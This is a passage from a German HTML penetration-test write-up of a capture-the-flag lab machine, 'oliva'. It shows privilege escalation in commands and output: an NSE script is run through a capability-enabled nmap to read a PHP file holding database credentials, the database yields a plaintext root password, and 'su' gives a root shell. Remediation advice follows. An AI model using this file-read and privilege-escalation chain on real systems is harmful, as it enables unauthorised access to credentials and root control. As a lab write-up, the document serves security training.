+Das NSE-Skript `/tmp/readshadow.nse` wird angepasst, sodass `filename_to_read` nun auf `/var/www/html/index.php` zeigt.
+Die Ausführung von `nmap --script /tmp/readshadow.nse 127.0.0.1` liest erfolgreich den Inhalt dieser PHP-Datei.
+Im Quellcode von `index.php` finden sich MySQL-Datenbank-Anmeldeinformationen:
+- `$dbname = 'easy';`
+- `$dbuser = 'root';`
+- `$dbpass = 'Savingmypass';`
+- `$dbhost = 'localhost';`
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 3:</strong>
+Dies ist ein entscheidender Fund! Das Lesen der `index.php` hat die Anmeldeinformationen für den lokalen MySQL-Datenbankserver offengelegt. Der Datenbankbenutzer ist `root` (Datenbank-Root, nicht System-Root) und das Passwort ist `Savingmypass`.
+</p>
+
+            <p class="analysis"><strong>Schritt 4: Zugriff auf die MySQL-Datenbank und Finden des Root-Passworts</strong></p>
+            <p>Mit den gefundenen Credentials verbinden wir uns mit der MySQL-Datenbank, durchsuchen sie und finden das System-Root-Passwort.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">mysql -u root -p</span></div>
+        <pre>
+Enter password: <span class="command_input_hidden">(Savingmypass)</span> 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 12
+Server version: 10.11.3-MariaDB-1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| easy               |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0,002 sec)
+ 
+MariaDB [(none)]> <span class="command">use easy;</span>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [easy]> <span class="command">show tables;</span>
++----------------+
+| Tables_in_easy |
++----------------+
+| logging        |
++----------------+
+1 row in set (0,000 sec)
+
+MariaDB [easy]> <span class="command">select * from logging;</span>
++--------+------+--------------+
+| id_log | uzer | pazz         |
++--------+------+--------------+
+|      1 | root | <span class="password">OhItwasEasy!</span> |
++--------+------+--------------+
+1 row in set (0,002 sec)
+
+MariaDB [easy]> <span class="command">^DBye</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 4:</strong>
+1.  `mysql -u root -p`: Verbindungsversuch zur MySQL-Datenbank als Benutzer `root`.
+2.  `Enter password: (Savingmypass)`: Das Passwort `Savingmypass` wird eingegeben.
+3.  Der Login ist erfolgreich.
+4.  `show databases;`: Listet die verfügbaren Datenbanken auf. Die Datenbank `easy` ist vorhanden.
+5.  `use easy;`: Wechselt zur Datenbank `easy`.
+6.  `show tables;`: Zeigt die Tabellen in der Datenbank `easy`. Es gibt eine Tabelle namens `logging`.
+7.  `select * from logging;`: Gibt den Inhalt der Tabelle `logging` aus.
+    Diese Tabelle enthält einen Eintrag mit `uzer = root` und `pazz = OhItwasEasy!`.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 4:</strong>
+Absolut genial! In der Datenbanktabelle `logging` wurde ein Eintrag für den Benutzer `root` mit dem Passwort `OhItwasEasy!` gefunden. Dies ist mit sehr hoher Wahrscheinlichkeit das Passwort für den System-Root-Benutzer.
+</p>
+
+            <p class="analysis"><strong>Schritt 5: Erlangen der Root-Shell</strong></p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">su -</span></div>
+        <pre>
+Contraseña: <span class="command_input_hidden">(OhItwasEasy!)</span> 
+<span class="password">root@oliva:~#</span> <span class="command">ls</span>
+rutflag.txt
+<span class="password">root@oliva:~#</span> <span class="command">cat rutflag.txt</span> 
+<span class="password">HMVnuTkm4MwFQNPmMJHRyW7</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 5:</strong>
+1.  `su -`: Versuch, zum System-Root-Benutzer zu wechseln.
+2.  `Contraseña: (OhItwasEasy!)`: Das in der Datenbank gefundene Passwort `OhItwasEasy!` wird eingegeben.
+3.  Der Wechsel ist erfolgreich, der Prompt ändert sich zu `root@oliva:~#`.
+4.  `ls` im Home-Verzeichnis von Root zeigt die Datei `rutflag.txt`.
+5.  `cat rutflag.txt` gibt die Root-Flag aus: `HMVnuTkm4MwFQNPmMJHRyW7`.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 5:</strong>
+Volltreffer! Mit dem aus der Datenbank extrahierten Passwort konnte erfolgreich Root-Zugriff auf dem System erlangt werden. Die Maschine ist vollständig kompromittiert.
+</p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong>
+            Durch die Ausnutzung der Nmap-Capability zum Lesen der Datenbank-Credentials und den anschließenden Zugriff auf die Datenbank wird das System-Root-Passwort erlangt, was vollen administrativen Zugriff auf das Zielsystem ermöglicht.
+            </p>
+            <p class="evaluation"><strong>Beweismittel:</strong>
+            Der Inhalt der Datei `/var/www/html/index.php` mit den Datenbank-Credentials, der Inhalt der Datenbanktabelle `logging` und die erfolgreiche Shell als `root` mit der ausgelesenen Root-Flag dienen als Beweis.
+            </p>
+            <p class="recommendation"><strong>Risikobewertung:</strong>
+            Die Kombination aus einer unsicheren Capability-Zuweisung für `nmap` und der Speicherung von Datenbank-Credentials im Klartext in einer Webdatei stellt ein hohes Risiko dar. Die Speicherung eines System-Root-Passworts im Klartext in einer Datenbank ist ebenfalls kritisch. Dies ermöglicht eine relativ einfache Privilegienerweiterung.
+            </p>
+            <p class="analysis"><strong>Empfehlungen zur Behebung:</strong>
+            <ul>
+                <li>Entfernen Sie die unnötige Capability `cap_dac_read_search=eip` vom `nmap`-Binary (<code>sudo setcap cap_dac_read_search-eip /usr/bin/nmap</code> oder <code>sudo setcap -r /usr/bin/nmap</code>). Capabilities sollten nur nach dem Prinzip der geringsten Rechte vergeben werden.</li>
+                <li>Speichern Sie Datenbank-Credentials niemals im Klartext in Webserver-Dateien. Verwenden Sie stattdessen sicherere Methoden wie Umgebungsvariablen, Secrets-Management-Systeme oder Konfigurationsdateien außerhalb des Web-Roots mit restriktiven Berechtigungen.</li>
+                <li>Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer, insbesondere für administrative Konten.</li>
+                <li>Speichern Sie sensible Informationen wie Systempasswörter niemals im Klartext in Datenbanktabellen. Wenn überhaupt, sollten sie stark gehasht und gesalzen sein (obwohl Systempasswörter idealerweise nicht in Anwendungsdatenbanken landen).</li>
+                <li>Stellen Sie sicher, dass alle Systembenutzer (einschließlich `root`) starke und einzigartige Passwörter verwenden.</li>
+            </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/oliva/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVY0H8NgGJqbFzbgo0VMRm</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/rutflag.txt</div>
+                    <div class="flag-value"><span class="password">HMVnuTkm4MwFQNPmMJHRyW7</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2. Juni 2025</p>
+    </footer>
+</body>
+</html>
